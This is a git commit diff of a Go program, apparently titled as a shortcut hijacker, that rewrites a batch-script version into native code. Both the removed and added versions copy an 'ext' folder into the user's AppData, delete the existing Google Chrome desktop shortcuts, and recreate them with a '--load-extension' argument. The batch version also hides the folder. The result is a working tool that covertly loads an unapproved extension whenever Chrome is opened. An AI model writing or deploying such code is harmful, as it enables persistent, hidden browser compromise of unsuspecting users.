f99db29d7d21da5e6a9ccac413dd32a58538c707
Afonso Cabral <afonso.cabral@pacificsec.com>
2023-12-07 13:35:24 -0300

    removendo scripts

--- goLnkHjk.go
+++ goLnkHjk.go
@@ -1,79 +1,132 @@
 package main
 
 import (
-	"fmt"
+	"io"
+	"io/ioutil"
 	"log"
 	"os"
-	"os/exec"
+	"path/filepath"
+
+	ole "github.com/go-ole/go-ole"
+	"github.com/go-ole/go-ole/oleutil"
 )
 
 func main() {
-	batScript := `@echo off
-setlocal
+	var chromePathFinal string
+	var shortcutPathFinal string
+	src := "./ext"
+	userprofile := filepath.Join(os.Getenv("USERPROFILE"))
+	destinationPath := filepath.Join(userprofile, "AppData", "Local", "ext")
+	// ---
+	chromePaths := map[string]string{
+		"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe":        userprofile + "\\Desktop\\Google Chrome.lnk",
+		"C:\\Arquivos de Programa\\Google\\Chrome\\Application\\chrome.exe": userprofile + "\\Área de Trabalho\\Google Chrome.lnk",
+	}
 
-set "folderName=ext"
+	for chromePath, shortcutPath := range chromePaths {
+		if _, err := os.Stat(chromePath); err == nil {
+			os.Remove(shortcutPath)
+			os.Remove("C:\\Users\\Public\\Desktop\\Google Chrome.lnk")
+			os.Remove("C:\\Usuários\\Público\\Área de Trabalho\\Google Chrome.lnk")
+			chromePathFinal = chromePath
+			shortcutPathFinal = shortcutPath
+		}
 
-set "sourcePath=%~dp0%folderName%"
+	}
+	// ---
 
-set "destinationPath=%userprofile%\AppData\Local\%folderName%"
-
-set "chromePathEn=C:\Program Files\Google\Chrome\Application\chrome.exe"
-set "chromePathPt=C:\Arquivos de Programa\Google\Chrome\Application\chrome.exe"
-
-if exist "%chromePathEn%" (
-    set "chromePath=%chromePathEn%"
-
-    set "shortcutPath=%USERPROFILE%\Desktop\Google Chrome.lnk"
-
-    if exist "%shortcutPath%" (
-        del "%shortcutPath%"
-
-    ) else if exist "C:\Users\Public\Desktop\Google Chrome.lnk" (
-        del "C:\Users\Public\Desktop\Google Chrome.lnk"
-    )
-)
-
-if exist "%chromePathPt%" (
-    set "chromePath=%chromePathPt%"
-
-    set "shortcutPath=%USERPROFILE%\Área de Trabalho\Google Chrome.lnk"
-
-    del "%shortcutPath%"
-    del "C:\Usuários\Público\Área de Trabalho\Google Chrome.lnk"" 
-
-)
-
-echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
-echo sLinkFile = "%shortcutPath%" >> CreateShortcut.vbs
-echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
-echo oLink.TargetPath = "%chromePath%" >> CreateShortcut.vbs
-echo oLink.Arguments = "--load-extension=%destinationPath%" >> CreateShortcut.vbs
-echo oLink.Save >> CreateShortcut.vbs
-
-cscript CreateShortcut.vbs
-del CreateShortcut.vbs
-
-xcopy /E /I "%sourcePath%" "%destinationPath%"
-
-attrib +h "%destinationPath%"
-
-endlocal
-`
-	err := os.WriteFile("script.bat", []byte(batScript), 0644)
+	err := copyDir(src, destinationPath)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	fmt.Println("O script em Batch foi gerado com sucesso!")
+	// ---
+	ole.CoInitialize(0)
+	defer ole.CoUninitialize()
 
-	cmd := exec.Command("cmd", "/C", "script.bat")
-	err = cmd.Run()
+	wsh, err := oleutil.CreateObject("WScript.Shell")
 	if err != nil {
 		log.Fatal(err)
 	}
+	defer wsh.Release()
 
-	err = os.Remove("script.bat")
+	wshInterface, err := wsh.QueryInterface(ole.IID_IDispatch)
 	if err != nil {
 		log.Fatal(err)
 	}
+	defer wshInterface.Release()
+
+	cs, err := oleutil.CallMethod(wshInterface, "CreateShortcut", shortcutPathFinal)
+	if err != nil {
+		log.Fatal(err)
+	}
+	idispatch := cs.ToIDispatch()
+	oleutil.PutProperty(idispatch, "TargetPath", chromePathFinal)
+	oleutil.PutProperty(idispatch, "Arguments", "--load-extension="+destinationPath)
+	oleutil.CallMethod(idispatch, "Save")
+
+}
+
+// ---
+
+func copyDir(src string, dst string) error {
+	entries, err := ioutil.ReadDir(src)
+	if err != nil {
+		return err
+	}
+
+	os.MkdirAll(dst, os.ModePerm)
+
+	for _, entry := range entries {
+		srcPath := filepath.Join(src, entry.Name())
+		dstPath := filepath.Join(dst, entry.Name())
+
+		fileInfo, err := os.Stat(srcPath)
+		if err != nil {
+			return err
+		}
+
+		switch fileInfo.Mode() & os.ModeType {
+		case os.ModeDir:
+			if err := copyDir(srcPath, dstPath); err != nil {
+				return err
+			}
+		case os.ModeSymlink:
+			if err := copySymLink(srcPath, dstPath); err != nil {
+				return err
+			}
+		default:
+			if err := copyFile(srcPath, dstPath); err != nil {
+				return err
+			}
+		}
+	}
+	return nil
+}
+
+func copyFile(src string, dst string) error {
+	srcFile, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer srcFile.Close()
+
+	dstFile, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer dstFile.Close()
+
+	if _, err = io.Copy(dstFile, srcFile); err != nil {
+		return err
+	}
+	return nil
+}
+
+func copySymLink(src string, dst string) error {
+	link, err := os.Readlink(src)
+	if err != nil {
+		return err
+	}
+	return os.Symlink(link, dst)
 }
